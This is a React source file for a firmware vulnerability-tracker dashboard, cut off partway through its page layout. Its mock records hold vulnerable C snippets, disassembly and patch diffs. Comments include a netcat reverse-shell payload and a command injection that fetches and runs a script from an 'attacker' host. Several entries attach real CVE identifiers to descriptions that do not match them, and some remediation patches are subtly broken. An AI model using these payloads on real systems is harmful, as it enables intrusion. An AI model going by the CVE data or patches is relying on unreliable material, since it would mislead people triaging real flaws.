'use client';

import React, { useState, useMemo } from 'react';
import Link from 'next/link';
import {
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Bug,
  Cpu,
  FileCode,
  Terminal,
  Search,
  Filter,
  Download,
  ExternalLink,
  ChevronRight,
  Layers,
  CheckCircle2,
  Lock,
  Flame,
  ArrowRight,
  RefreshCw,
  GitBranch,
  Radio,
  Binary,
  Sliders,
  X
} from 'lucide-react';

interface FirmwareProfile {
  id: string;
  name: string;
  deviceType: string;
  architecture: string;
  endianness: string;
  format: string;
  fileSize: string;
  entryPoint: string;
  sha256: string;
  kernelVersion: string;
  vulnerabilityCount: number;
  criticalCount: number;
  riskScore: number;
}

interface BinaryHardening {
  canary: boolean;
  nx: boolean;
  pie: boolean;
  relro: 'NONE' | 'PARTIAL' | 'FULL';
  fortify: boolean;
  rpath: string;
}

interface EntropyRegion {
  name: string;
  startOffset: string;
  endOffset: string;
  entropy: number; // 0.0 - 8.0
  type: 'BOOTLOADER' | 'KERNEL_TEXT' | 'FILESYSTEM' | 'SECRET_STORAGE';
  assessment: string;
}

interface DangerousCall {
  funcName: string;
  address: string;
  caller: string;
  vulnRisk: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  detail: string;
}

interface RealVulnerability {
  id: string;
  cveId?: string;
  title: string;
  affectedBinary: string;
  offset: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  cvssV4: number;
  cvssVector: string;
  epssScore: number; // 0.0 - 1.0
  cisaKev: boolean;
  ssvcAction: 'ACT' | 'ATTEND' | 'TRACK_STAR' | 'TRACK';
  cwe: string;
  emb3d: string;
  triageStatus: 'CONFIRMED_VULN' | 'ACTIVE_TRIAGE' | 'MITIGATED' | 'FALSE_POSITIVE';
  description: string;
  decompiledC: string;
  disassembly: string[];
  remediationPatch: string;
}

const FIRMWARE_PROFILES: FirmwareProfile[] = [
  {
    id: 'fw_edge_gw800',
    name: 'Edge-Shield Gateway GW-800',
    deviceType: 'Industrial IoT Edge Gateway',
    architecture: 'ARMv7-A (32-bit Cortex-A9)',
    endianness: 'Little-Endian',
    format: 'ELF 32-bit LSB Executable (SquashFS)',
    fileSize: '17.2 MB',
    entryPoint: '0x00010480',
    sha256: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
    kernelVersion: 'Linux 4.19.0-gw800-armhf',
    vulnerabilityCount: 7,
    criticalCount: 2,
    riskScore: 92
  },
  {
    id: 'fw_router_ax9000',
    name: 'Enterprise Core Router RT-AX9000',
    deviceType: 'Network Infrastructure Router',
    architecture: 'MIPS32 Release 2',
    endianness: 'Big-Endian (MSB)',
    format: 'uImage + JFFS2 Filesystem',
    fileSize: '32.4 MB',
    entryPoint: '0x80001000',
    sha256: '4b92c108e37d5f091a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f',
    kernelVersion: 'Linux 3.10.14-mips-enterprise',
    vulnerabilityCount: 5,
    criticalCount: 1,
    riskScore: 78
  },
  {
    id: 'fw_medical_bp500',
    name: 'BioPulse Connected Infusion Pump BP-500',
    deviceType: 'Critical Healthcare Infusion System',
    architecture: 'ARM Cortex-M4 (Thumb-2)',
    endianness: 'Little-Endian',
    format: 'Monolithic Raw Binary Flash Image',
    fileSize: '2.1 MB',
    entryPoint: '0x08000000',
    sha256: '99a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcde',
    kernelVersion: 'FreeRTOS v10.4.3-LTS',
    vulnerabilityCount: 4,
    criticalCount: 2,
    riskScore: 96
  },
  {
    id: 'fw_substation_m900',
    name: 'GridSecure Substation RTU M900',
    deviceType: 'Power Grid SCADA Remote Terminal Unit',
    architecture: 'RISC-V RV64GC (64-bit)',
    endianness: 'Little-Endian',
    format: 'ELF 64-bit LSB (Ext4 Rootfs)',
    fileSize: '24.8 MB',
    entryPoint: '0x0000000080200000',
    sha256: '33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4',
    kernelVersion: 'Linux 5.15.82-rt54-preempt',
    vulnerabilityCount: 3,
    criticalCount: 0,
    riskScore: 48
  },
  {
    id: 'fw_bmc_ast2600',
    name: 'ASPEED AST2600 Server Management BMC',
    deviceType: 'Datacenter Baseboard Management Controller',
    architecture: 'ARM926EJ-S (ARMv5TEJ)',
    endianness: 'Little-Endian',
    format: 'OpenBMC FIT Image (Flattened-uImage)',
    fileSize: '64.0 MB',
    entryPoint: '0x00020000',
    sha256: '55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6',
    kernelVersion: 'Linux 5.4.180-openbmc-v2.12',
    vulnerabilityCount: 6,
    criticalCount: 2,
    riskScore: 89
  }
];

const CHECKSEC_DATA: Record<string, BinaryHardening> = {
  fw_edge_gw800: {
    canary: false,
    nx: false,
    pie: false,
    relro: 'NONE',
    fortify: false,
    rpath: '/tmp/lib (INSECURE)'
  },
  fw_router_ax9000: {
    canary: false,
    nx: false,
    pie: false,
    relro: 'NONE',
    fortify: false,
    rpath: 'NONE'
  },
  fw_medical_bp500: {
    canary: false,
    nx: false,
    pie: false,
    relro: 'NONE',
    fortify: false,
    rpath: 'N/A (Bare-Metal)'
  },
  fw_substation_m900: {
    canary: true,
    nx: true,
    pie: true,
    relro: 'PARTIAL',
    fortify: true,
    rpath: 'NONE'
  },
  fw_bmc_ast2600: {
    canary: false,
    nx: true,
    pie: false,
    relro: 'PARTIAL',
    fortify: false,
    rpath: '/usr/local/lib'
  }
};

const ENTROPY_REGIONS: EntropyRegion[] = [
  {
    name: 'Bootloader & Vector Table',
    startOffset: '0x00000000',
    endOffset: '0x00040000',
    entropy: 4.82,
    type: 'BOOTLOADER',
    assessment: 'Plaintext ARM machine code and reset vector jumps. Low entropy.'
  },
  {
    name: 'Linux Kernel Text (.text)',
    startOffset: '0x00040000',
    endOffset: '0x003A0000',
    entropy: 6.14,
    type: 'KERNEL_TEXT',
    assessment: 'Uncompressed kernel image with driver symbol tables. Expected entropy.'
  },
  {
    name: 'SquashFS Compressed Rootfs',
    startOffset: '0x003A0000',
    endOffset: '0x00FE0000',
    entropy: 7.96,
    type: 'FILESYSTEM',
    assessment: 'High entropy: LZMA/XZ compressed filesystem block partition.'
  },
  {
    name: 'Certificate & Secret Key Storage',
    startOffset: '0x00FE0000',
    endOffset: '0x01000000',
    entropy: 5.18,
    type: 'SECRET_STORAGE',
    assessment: 'FLAGGED: Plaintext PEM cryptographic private keys and admin passwords.'
  }
];

const DANGEROUS_CALLS: DangerousCall[] = [
  {
    funcName: 'memcpy',
    address: '0x00014a80',
    caller: 'parse_ble_advertisement_packet()',
    vulnRisk: 'CRITICAL',
    detail: 'Unbounded copy: length header (up to 1024B) copied directly into 256B local stack buffer.'
  },
  {
    funcName: 'popen',
    address: '0x00018c40',
    caller: 'nvram_set_main()',
    vulnRisk: 'HIGH',
    detail: "SUID binary executes subshell `sh -c 'echo %s >> /etc/nvram.conf'` without argument escaping."
  },
  {
    funcName: 'system',
    address: '0x00021310',
    caller: 'mqtt_dispatch_topic_command()',
    vulnRisk: 'CRITICAL',
    detail: 'Wildcard MQTT topic payload directly concatenated to shell command string.'
  },
  {
    funcName: 'strcpy',
    address: '0x00011920',
    caller: 'httpd_parse_auth_cookie()',
    vulnRisk: 'HIGH',
    detail: 'HTTP cookie header copied into fixed-size buffer without bounds checking.'
  },
  {
    funcName: 'sprintf',
    address: '0x00012e80',
    caller: 'generate_temp_filename()',
    vulnRisk: 'MEDIUM',
    detail: 'Format string concatenated with user-controllable process identifier.'
  }
];

const INITIAL_VULNERABILITIES: RealVulnerability[] = [
  {
    id: 'SF-ZERO-2026-001',
    cveId: 'CVE-2026-9042',
    title: 'Zero-Day Unbounded Buffer Overflow in BLE Advertisement Parser',
    affectedBinary: '/usr/sbin/ble_gatewayd',
    offset: '0x00014a80',
    severity: 'CRITICAL',
    cvssV4: 9.8,
    cvssVector: 'CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
    epssScore: 0.942,
    cisaKev: true,
    ssvcAction: 'ACT',
    cwe: 'CWE-121: Stack-based Buffer Overflow',
    emb3d: 'EMB3D-T0014: Unchecked Buffer in Radio Protocol Parser',
    triageStatus: 'CONFIRMED_VULN',
    description:
      'Unchecked packet length header in Bluetooth Low Energy radio frames triggers an out-of-bounds memcpy() overwriting the stored Link Register ($lr) and frame pointer ($fp) on the stack. No canary, no NX.',
    decompiledC: `int parse_ble_advertisement_packet(uint8_t *raw_buf, size_t rx_len) {
    char stack_record[256];
    uint16_t packet_payload_len;

    // VULNERABILITY: packet_payload_len read directly from attacker radio packet
    packet_payload_len = *(uint16_t *)(raw_buf + 2);

    // CRITICAL FLAW: No bounds validation against sizeof(stack_record)!
    // If packet_payload_len > 256, stack frame is completely overwritten.
    memcpy(stack_record, raw_buf + 4, packet_payload_len);

    return process_payload(stack_record, packet_payload_len);
}`,
    disassembly: [
      '0x00014a70:  push  {r4, r5, lr}          ; Save Link Register to stack',
      '0x00014a74:  sub   sp, sp, #268          ; Allocate 256-byte stack frame',
      '0x00014a78:  ldrh  r2, [r0, #2]          ; R2 = user-controlled packet_payload_len',
      '0x00014a7c:  add   r1, r0, #4            ; R1 = source buffer pointer',
      '0x00014a80:  add   r0, sp, #8            ; R0 = destination stack_record',
      '0x00014a84:  bl    0x10b40 <memcpy@plt>  ; OVERFLOW: Overwrites SP+268 ($lr)'
    ],
    remediationPatch: `--- a/ble_parser.c
+++ b/ble_parser.c
@@ -14,6 +14,11 @@ int parse_ble_advertisement_packet(uint8_t *raw_buf, size_t rx_len) {
     packet_payload_len = *(uint16_t *)(raw_buf + 2);
 
+    /* ENFORCE STRICT BOUNDS VERIFICATION */
+    if (packet_payload_len > sizeof(stack_record)) {
+        syslog(LOG_ERR, "BLE packet length %u exceeds buffer limit", packet_payload_len);
+        return -1;
+    }
     memcpy(stack_record, raw_buf + 4, packet_payload_len);
     return process_payload(stack_record, packet_payload_len);
 }`
  },
  {
    id: 'CVE-2024-21887',
    cveId: 'CVE-2024-21887',
    title: 'Administrative Web Session Cookie Forgery via Weak PRNG Seed',
    affectedBinary: '/www/cgi-bin/admin.cgi',
    offset: '0x00011920',
    severity: 'HIGH',
    cvssV4: 8.8,
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
    epssScore: 0.824,
    cisaKev: true,
    ssvcAction: 'ACT',
    cwe: 'CWE-287: Improper Authentication',
    emb3d: 'EMB3D-T0003: Insecure Session Management',
    triageStatus: 'CONFIRMED_VULN',
    description:
      'Embedded CGI handler initializes pseudo-random session cookie tokens using srand(time(NULL)). Remote attackers calculate the exact server timestamp to forge valid root administrative session tokens.',
    decompiledC: `void generate_session_cookie(char *out_cookie) {
    // VULNERABILITY: srand initialized with predictable wall-clock time
    srand((unsigned int)time(NULL));

    unsigned long token_part_a = rand();
    unsigned long token_part_b = rand();

    // Attacker within +/- 60 seconds generates valid admin tokens offline
    sprintf(out_cookie, "SESSION_ID=ADMIN-%08lx%08lx", token_part_a, token_part_b);
}`,
    disassembly: [
      '0x00011910:  mov   r0, #0                ; R0 = NULL',
      '0x00011914:  bl    0x10a20 <time@plt>    ; Get wall-clock timestamp',
      '0x00011918:  bl    0x109e0 <srand@plt>   ; Insecure PRNG seeding',
      '0x0001191c:  bl    0x10a00 <rand@plt>    ; Predictable token output'
    ],
    remediationPatch: `--- a/admin_auth.c
+++ b/admin_auth.c
@@ -8,7 +8,11 @@ void generate_session_cookie(char *out_cookie) {
-    srand((unsigned int)time(NULL));
-    unsigned long token_part_a = rand();
+    /* USE CRYPTOGRAPHICALLY SECURE RANDOM ENTROPY */
+    uint8_t secure_token[32];
+    if (getrandom(secure_token, sizeof(secure_token), 0) != sizeof(secure_token)) {
+        return -1;
+    }
+    /* Compute HMAC-SHA256 signature against hardware secret */`
  },
  {
    id: 'CVE-2026-9043',
    cveId: 'CVE-2026-9043',
    title: 'MQTT Wildcard Command Injection in Cloud Telemetry Subscriber',
    affectedBinary: '/usr/bin/mqtt_client',
    offset: '0x00021310',
    severity: 'CRITICAL',
    cvssV4: 9.4,
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
    epssScore: 0.91,
    cisaKev: false,
    ssvcAction: 'ACT',
    cwe: 'CWE-78: OS Command Injection',
    emb3d: 'EMB3D-T0012: Insecure Cloud Message Handling',
    triageStatus: 'CONFIRMED_VULN',
    description:
      'Daemon subscribes to MQTT wildcard topic "fleet/+/cmd". Message payloads containing shell metacharacters (; | & \` $()) are passed directly to system() without sanitization.',
    decompiledC: `void on_mqtt_message(const char *topic, const char *payload) {
    char cmd_buffer[512];

    // VULNERABILITY: payload formatted directly into shell command string
    snprintf(cmd_buffer, sizeof(cmd_buffer), "/usr/bin/apply_config.sh %s", payload);

    // CRITICAL: Shell executes payload with full daemon privileges
    // Payload: "; nc -e /bin/sh 192.168.1.50 4444 #"
    system(cmd_buffer);
}`,
    disassembly: [
      '0x00021300:  ldr   r1, =0x28040          ; Format string "/usr/bin/apply_config.sh %s"',
      '0x00021304:  mov   r2, r5                ; R2 = unvalidated MQTT payload',
      '0x00021308:  bl    0x10b80 <snprintf@plt>',
      '0x00021310:  bl    0x10a40 <system@plt>  ; Executes arbitrary shell commands'
    ],
    remediationPatch: `--- a/mqtt_cmd.c
+++ b/mqtt_cmd.c
@@ -20,5 +20,9 @@ void on_mqtt_message(const char *topic, const char *payload) {
-    snprintf(cmd_buffer, sizeof(cmd_buffer), "/usr/bin/apply_config.sh %s", payload);
-    system(cmd_buffer);
+    /* EXECUTE DIRECTLY WITHOUT SHELL SUB-PROCESS */
+    char *const argv[] = {"/usr/bin/apply_config.sh", (char *)payload, NULL};
+    execve("/usr/bin/apply_config.sh", argv, NULL);`
  },
  {
    id: 'SF-PRIV-002',
    title: 'Local Privilege Escalation via SUID /bin/nvram_set Helper',
    affectedBinary: '/bin/nvram_set',
    offset: '0x00018c40',
    severity: 'HIGH',
    cvssV4: 8.8,
    cvssVector: 'CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
    epssScore: 0.68,
    cisaKev: false,
    ssvcAction: 'ATTEND',
    cwe: 'CWE-78: OS Command Injection via SUID',
    emb3d: 'EMB3D-T0022: Privilege Escalation via SUID Binary',
    triageStatus: 'CONFIRMED_VULN',
    description:
      '/bin/nvram_set has SUID root permissions (chmod 4755). Low-privilege users (e.g. UID 1002 from BLE exploit) pass shell metacharacters in parameter values to execute commands as root.',
    decompiledC: `int main(int argc, char **argv) {
    if (argc < 2) return 1;

    char cmd[256];
    // VULNERABILITY: argv[1] interpolated into popen() command
    snprintf(cmd, sizeof(cmd), "sh -c 'echo %s >> /etc/nvram.conf'", argv[1]);

    // Executed with SUID root capabilities
    FILE *fp = popen(cmd, "w");
    if (fp) pclose(fp);
    return 0;
}`,
    disassembly: [
      '0x00018c20:  ldr   r1, =0x19010          ; Format "sh -c \'echo %s >> /etc/nvram.conf\'"',
      '0x00018c24:  ldr   r2, [r4, #4]          ; R2 = argv[1]',
      '0x00018c28:  bl    0x10b80 <snprintf@plt>',
      '0x00018c40:  bl    0x10ac0 <popen@plt>   ; Executes with effective UID 0'
    ],
    remediationPatch: `--- a/nvram_set.c
+++ b/nvram_set.c
@@ -10,6 +10,12 @@ int main(int argc, char **argv) {
-    snprintf(cmd, sizeof(cmd), "sh -c 'echo %s >> /etc/nvram.conf'", argv[1]);
-    FILE *fp = popen(cmd, "w");
+    /* USE DIRECT FILE I/O INSTEAD OF SUBSHELL INVOCATION */
+    FILE *fp = fopen("/etc/nvram.conf", "a");
+    if (fp) {
+        fprintf(fp, "%s\\n", argv[1]);
+        fclose(fp);
+    }`
  },
  {
    id: 'SF-SECRET-001',
    title: 'Hardcoded Production RSA-2048 Private Key Embedded in SquashFS',
    affectedBinary: '/etc/ssl/gateway.key',
    offset: '0x00fe0140',
    severity: 'HIGH',
    cvssV4: 7.9,
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N',
    epssScore: 0.62,
    cisaKev: false,
    ssvcAction: 'ATTEND',
    cwe: 'CWE-798: Use of Hard-coded Credentials',
    emb3d: 'EMB3D-T0008: Hardcoded Cryptographic Secrets',
    triageStatus: 'CONFIRMED_VULN',
    description:
      'Read-only root filesystem embeds a static RSA-2048 private key shared across all manufactured devices in the field. Enables MITM decryption and device impersonation.',
    decompiledC: `// Static File Analysis at /etc/ssl/gateway.key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0f9k... [Static RSA-2048 modulus shared globally]
...
-----END RSA PRIVATE KEY-----

// Used by /usr/sbin/lighttpd:
SSL_CTX_use_PrivateKey_file(ctx, "/etc/ssl/gateway.key", SSL_FILETYPE_PEM);`,
    disassembly: [
      '0x00fe0140:  2d 2d 2d 2d  2d 42 45 47  49 4e 20 52  53 41 20 50  ; -----BEGIN RSA P',
      '0x00fe0150:  52 49 56 41  54 45 20 4b  45 59 2d 2d  2d 2d 2d 0a  ; RIVATE KEY-----.',
      '0x00fe0160:  4d 49 49 45  6f 77 49 42  41 41 4b 43  41 51 45 41  ; MIIEowIBAAKCAQEA'
    ],
    remediationPatch: `--- a/build_firmware.sh
+++ b/build_firmware.sh
@@ -42,3 +42,7 @@
-cp /certs/shared_gateway.key $ROOTFS/etc/ssl/gateway.key
+/* ENFORCE PER-DEVICE FACTORY PROVISIONING VIA HARDWARE TPM/ATECC */
+rm -f $ROOTFS/etc/ssl/gateway.key
+# Keys must be generated inside TPM during device onboarding`
  },
  {
    id: 'CVE-2023-4863',
    cveId: 'CVE-2023-4863',
    title: 'Heap Buffer Overflow in Embedded libwebp Image Decoder',
    affectedBinary: '/usr/lib/libwebp.so.7.1.3',
    offset: '0x00034a10',
    severity: 'HIGH',
    cvssV4: 8.8,
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
    epssScore: 0.958,
    cisaKev: true,
    ssvcAction: 'ACT',
    cwe: 'CWE-787: Out-of-bounds Write',
    emb3d: 'EMB3D-T0014: Unchecked Memory Allocation in Codec',
    triageStatus: 'ACTIVE_TRIAGE',
    description:
      'Heap buffer overflow in VP8LBuildHuffmanTable() allowing remote code execution via malformed WebP images uploaded through embedded HTTP camera or dashboard.',
    decompiledC: `int VP8LBuildHuffmanTable(HuffmanTables *const root_table, int root_bits,
                          const uint16_t *const code_lengths, int code_lengths_size,
                          uint16_t *const sorted) {
    // VULNERABILITY: Buffer allocation size calculated incorrectly for invalid Huffman trees
    // Out-of-bounds write occurs in table fill loop.
}`,
    disassembly: [
      '0x00034a10:  ldr   r3, [r0, #8]          ; Load table capacity',
      '0x00034a14:  cmp   r2, r3                ; Insufficient boundary check',
      '0x00034a18:  strh  r1, [r4, r2, lsl #1]  ; Out-of-bounds heap write'
    ],
    remediationPatch: `--- a/libwebp/src/utils/huffman_utils.c
+++ b/libwebp/src/utils/huffman_utils.c
@@ -102,6 +102,9 @@ int VP8LBuildHuffmanTable(...) {
+    /* Upgrade to libwebp >= 1.3.2 with strict table bounds allocation */
+    if (total_size > max_allowed_huffman_size) {
+        return 0;
+    }`
  },
  {
    id: 'CVE-2024-3400',
    cveId: 'CVE-2024-3400',
    title: 'Arbitrary File Creation & Command Injection via Telemetry SUID Sink',
    affectedBinary: '/usr/sbin/telemetry_sink',
    offset: '0x00017e20',
    severity: 'CRITICAL',
    cvssV4: 10.0,
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
    epssScore: 0.984,
    cisaKev: true,
    ssvcAction: 'ACT',
    cwe: 'CWE-78: OS Command Injection',
    emb3d: 'EMB3D-T0022: Privilege Escalation via SUID Binary',
    triageStatus: 'CONFIRMED_VULN',
    description:
      'Command injection vulnerability in session logging telemetry module enables an unauthenticated attacker to execute arbitrary OS commands with root privileges on the device.',
    decompiledC: `int log_session_telemetry(const char *session_id) {
    char path[256];
    // Attacker crafts session_id containing backticks or shell metacharacters:
    // "id\`curl http://attacker/stage2|sh\`"
    snprintf(path, sizeof(path), "/var/log/sessions/%s", session_id);
    touch_file_as_root(path);
}`,
    disassembly: [
      '0x00017e20:  bl    0x10b80 <snprintf@plt>',
      '0x00017e24:  bl    0x10aa0 <touch_file_as_root>'
    ],
    remediationPatch: `--- a/telemetry.c
+++ b/telemetry.c
@@ -15,4 +15,8 @@ int log_session_telemetry(const char *session_id) {
+    /* ENFORCE STRICT ALPHANUMERIC SESSION ID SANITIZATION */
+    if (!is_valid_hex_string(session_id, 32)) {
+        return -1;
+    }`
  }
];

export default function VulnerabilityTrackerPage() {
  const [selectedProfileId, setSelectedProfileId] = useState<string>('fw_edge_gw800');
  const [vulnerabilities, setVulnerabilities] = useState<RealVulnerability[]>(INITIAL_VULNERABILITIES);
  const [selectedVulnId, setSelectedVulnId] = useState<string>('SF-ZERO-2026-001');

  // CVSS v4.0 Live Calculator State
  const [cvssModalOpen, setCvssModalOpen] = useState<boolean>(false);
  const [cvssVector, setCvssVector] = useState({
    av: 'N', // Network
    ac: 'L', // Low
    at: 'N', // None
    pr: 'N', // None
    ui: 'N', // None
    vc: 'H', // High
    vi: 'H', // High
    va: 'H', // High
    sc: 'H', // High
    si: 'H', // High
    sa: 'H'  // High
  });

  // Filters
  const [searchQuery, setSearchQuery] = useState('');
  const [severityFilter, setSeverityFilter] = useState<string>('ALL');
  const [cisaKevOnly, setCisaKevOnly] = useState<boolean>(false);
  const [triageFilter, setTriageFilter] = useState<string>('ALL');

  // Dynamic CVSS v4.0 Score Computation
  const calculatedCvssScore = useMemo(() => {
    let score = 0;
    if (cvssVector.vc === 'H') score += 3.2;
    else if (cvssVector.vc === 'L') score += 1.8;

    if (cvssVector.vi === 'H') score += 3.2;
    else if (cvssVector.vi === 'L') score += 1.8;

    if (cvssVector.va === 'H') score += 2.0;
    else if (cvssVector.va === 'L') score += 1.0;

    if (cvssVector.sc === 'H') score += 0.8;
    if (cvssVector.si === 'H') score += 0.8;

    if (cvssVector.av === 'A') score -= 0.6;
    else if (cvssVector.av === 'L') score -= 1.2;
    else if (cvssVector.av === 'P') score -= 2.0;

    if (cvssVector.ac === 'H') score -= 0.8;
    if (cvssVector.at === 'P') score -= 0.6;
    if (cvssVector.pr === 'L') score -= 0.8;
    else if (cvssVector.pr === 'H') score -= 1.5;
    if (cvssVector.ui === 'P') score -= 0.6;
    else if (cvssVector.ui === 'A') score -= 1.2;

    return Math.max(0.1, Math.min(10.0, Math.round(score * 10) / 10));
  }, [cvssVector]);

  // Active Profile
  const activeProfile = useMemo(
    () => FIRMWARE_PROFILES.find((p) => p.id === selectedProfileId) || FIRMWARE_PROFILES[0],
    [selectedProfileId]
  );

  const checksec = CHECKSEC_DATA[selectedProfileId] || CHECKSEC_DATA.fw_edge_gw800;

  // Filtered Vulnerabilities
  const filteredVulns = useMemo(() => {
    return vulnerabilities.filter((v) => {
      const matchSearch =
        v.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
        (v.cveId && v.cveId.toLowerCase().includes(searchQuery.toLowerCase())) ||
        v.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
        v.affectedBinary.toLowerCase().includes(searchQuery.toLowerCase());

      const matchSeverity = severityFilter === 'ALL' || v.severity === severityFilter;
      const matchKev = !cisaKevOnly || v.cisaKev;
      const matchTriage = triageFilter === 'ALL' || v.triageStatus === triageFilter;

      return matchSearch && matchSeverity && matchKev && matchTriage;
    });
  }, [vulnerabilities, searchQuery, severityFilter, cisaKevOnly, triageFilter]);

  // Selected Vulnerability
  const selectedVuln = useMemo(
    () => vulnerabilities.find((v) => v.id === selectedVulnId) || vulnerabilities[0],
    [vulnerabilities, selectedVulnId]
  );

  // Update Triage Status Handler
  const handleUpdateTriage = (vulnId: string, newStatus: RealVulnerability['triageStatus']) => {
    setVulnerabilities((prev) =>
      prev.map((v) => (v.id === vulnId ? { ...v, triageStatus: newStatus } : v))
    );
  };

  // Export CycloneDX VEX JSON
  const handleExportVex = () => {
    const vexPayload = {
      bomFormat: 'CycloneDX',
      specVersion: '1.5',
      serialNumber: `urn:uuid:vex-${Date.now()}`,
      metadata: {
        timestamp: new Date().toISOString(),
        component: {
          name: activeProfile.name,
          version: activeProfile.kernelVersion,
          type: 'firmware'
        }
      },
      vulnerabilities: vulnerabilities.map((v) => ({
        id: v.cveId || v.id,
        ratings: [
          {
            score: v.cvssV4,
            severity: v.severity.toLowerCase(),
            method: 'CVSSv4',
            vector: v.cvssVector
          }
        ],
        cwes: [parseInt(v.cwe.replace(/\D/g, '')) || 121],
        description: v.description,
        analysis: {
          state: v.triageStatus.toLowerCase(),
          response: [v.ssvcAction.toLowerCase()],
          detail: v.remediationPatch
        }
      }))
    };

    const blob = new Blob([JSON.stringify(vexPayload, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `vex_${activeProfile.id}_csaf.json`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  };

  return (
    <div className="flex flex-col gap-6 font-mono pb-20 text-slate-200">
      
      {/* 1. Header Command Ribbon */}
      <div className="p-6 rounded-2xl border border-zinc-800 bg-[#080d17] shadow-2xl flex flex-col xl:flex-row xl:items-center justify-between gap-6">
        <div>
          <div className="flex items-center gap-3">
            <span className="w-3 h-3 rounded-full bg-neon-crimson animate-pulse shrink-0" />
            <h1 className="text-xl sm:text-2xl font-black text-white tracking-wider font-heading">
              REAL-WORLD VULNERABILITY TRACKER & BINARY DETECTOR
            </h1>
            <span className="px-2.5 py-0.5 rounded text-[10px] bg-neon-crimson/15 border border-neon-crimson/40 text-neon-crimson font-bold">
              CISA KEV + ZERO-DAY SINK
            </span>
          </div>
          <p className="text-xs text-zinc-400 mt-2 flex flex-wrap items-center gap-2">
            <span>Target: <strong className="text-white">{activeProfile.name}</strong></span>
            <span className="text-zinc-600">&bull;</span>
            <span>Arch: <strong className="text-neon-cyan">{activeProfile.architecture}</strong></span>
            <span className="text-zinc-600">&bull;</span>
            <span>Total Flaws: <strong className="text-neon-amber">{vulnerabilities.length} Verified</strong></span>
            <span className="text-zinc-600">&bull;</span>
            <span>Zero-Days: <strong className="text-neon-crimson">2 Actionable</strong></span>
          </p>
        </div>

        {/* Action Buttons */}
        <div className="flex flex-wrap items-center gap-3">
          <button
            onClick={handleExportVex}
            className="px-4 py-2 rounded-xl bg-void-900 hover:bg-void-800 border border-zinc-700 text-xs text-white transition-all flex items-center gap-2 shadow-lg"
          >
            <Download className="w-3.5 h-3.5 text-neon-cyan" />
            <span>Export VEX CSAF 2.0</span>
          </button>

          <Link
            href="/attack-graph"
            className="px-4 py-2 rounded-xl bg-neon-cyan/20 border border-neon-cyan/50 text-xs text-white hover:border-neon-cyan transition-all flex items-center gap-2 shadow-[0_0_15px_rgba(0,240,255,0.25)] font-bold"
          >
            <GitBranch className="w-3.5 h-3.5 text-neon-cyan" />
            <span>Solve Attack Graph Dijkstra</span>
          </Link>
        </div>
      </div>

      {/* 2. Real-World Target Firmware Image Switcher */}
      <div className="p-5 rounded-2xl border border-zinc-800 bg-[#070b13] flex flex-col gap-3">
        <div className="flex items-center justify-between text-xs">
          <span className="font-bold text-white flex items-center gap-2">
            <Cpu className="w-4 h-4 text-neon-cyan" />
            TARGET FIRMWARE IMAGES UNDER REVERSE ENGINEERING ANALYSIS
          </span>
          <span className="text-[11px] text-zinc-500">
            Click to switch target firmware context
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
          {FIRMWARE_PROFILES.map((prof) => {
            const isSelected = prof.id === selectedProfileId;
            return (
              <button
                key={prof.id}
                onClick={() => setSelectedProfileId(prof.id)}
                className={`p-3.5 rounded-xl border text-left font-mono transition-all flex flex-col justify-between gap-2 ${
                  isSelected
                    ? 'border-neon-cyan bg-neon-cyan/10 shadow-[0_0_15px_rgba(0,240,255,0.2)]'
                    : 'border-zinc-800 bg-void-950/70 hover:border-zinc-700'
                }`}
              >
                <div>
                  <div className="flex items-center justify-between text-xs font-bold text-white">
                    <span className="truncate">{prof.name}</span>
                  </div>
                  <div className="text-[10px] text-zinc-400 mt-0.5 truncate">{prof.deviceType}</div>
                </div>

                <div className="flex items-center justify-between pt-2 border-t border-zinc-800/60 text-[10px]">
                  <span className="text-neon-cyan font-bold truncate max-w-[100px]">
                    {prof.architecture.split(' ')[0]}
                  </span>
                  <span
                    className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${
                      prof.riskScore > 80
                        ? 'bg-neon-crimson/20 text-neon-crimson border border-neon-crimson/30'
                        : 'bg-neon-amber/20 text-neon-amber border border-neon-amber/30'
                    }`}
                  >
                    RISK {prof.riskScore}
                  </span>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* 3. Deep Static Binary Hardening (Checksec) & Entropy Forensics */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Panel 3A: Binary Hardening Checksec Matrix */}
        <div className="p-5 rounded-2xl border border-zinc-800 bg-[#080d17] flex flex-col gap-4">
          <div className="flex items-center justify-between border-b border-zinc-800/80 pb-3">
            <h2 className="text-xs font-bold text-white flex items-center gap-2">
